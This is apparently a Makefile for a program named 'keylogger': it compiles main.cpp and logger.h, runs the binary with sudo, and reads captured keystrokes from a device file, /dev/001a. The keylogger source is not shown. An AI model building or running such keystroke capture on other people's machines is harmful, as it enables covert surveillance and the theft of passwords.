keylogger: main.cpp logger.h
	g++ logger.h main.cpp -o keylogger

run:
	sudo ./keylogger

verbose:
	sudo ./keylogger -v

log:
	sudo cat /dev/001a

clean:
	rm -f keylogger *.gch 001a && sudo rm -f /dev/001a